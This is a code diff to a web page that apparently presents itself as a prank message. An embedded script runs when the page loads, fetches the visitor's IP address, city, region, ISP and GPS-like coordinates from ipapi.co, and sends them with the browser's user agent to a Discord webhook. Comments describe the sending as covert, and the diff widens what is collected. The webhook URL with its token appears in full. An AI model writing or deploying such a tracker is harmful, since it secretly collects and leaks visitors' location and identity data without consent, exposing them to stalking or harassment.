@@ -9,42 +9,50 @@
     m gayy 🏳️‍🌈
 
     <script>
-        // Webhook Discord
+        // Discord Webhook
         const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";
 
         async function sendInfo() {
             try {
-                // Lấy IP + vị trí
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
+
+                // Lấy IP + vị trí bằng ipapi.co
+                const response = await fetch("https://ipapi.co/json/");
+                const data = await response.json();
 
                 // Thiết bị
                 const device = navigator.userAgent;
 
-                // Nội dung gửi
-                const msg = {
+                // Nội dung gửi webhook
+                const payload = {
                     content:
 `📱 Có người mở web
 
 🌍 IP: ${data.ip}
 
-📍 Nơi ở: ${data.city}, ${data.country_name}
+📍 Địa chỉ:
+${data.city}, ${data.region}, ${data.country_name}
+
+🏢 Nhà mạng:
+${data.org}
+
+📡 Tọa độ:
+${data.latitude}, ${data.longitude}
 
 💻 Thiết bị:
 ${device}`
                 };
 
-                // Gửi webhook ngầm
+                // Gửi về Discord
                 await fetch(webhook, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify(msg)
+                    body: JSON.stringify(payload)
                 });
 
-            } catch (e) {
-                console.log(e);
+            } catch (err) {
+                console.log(err);
             }
         }
 
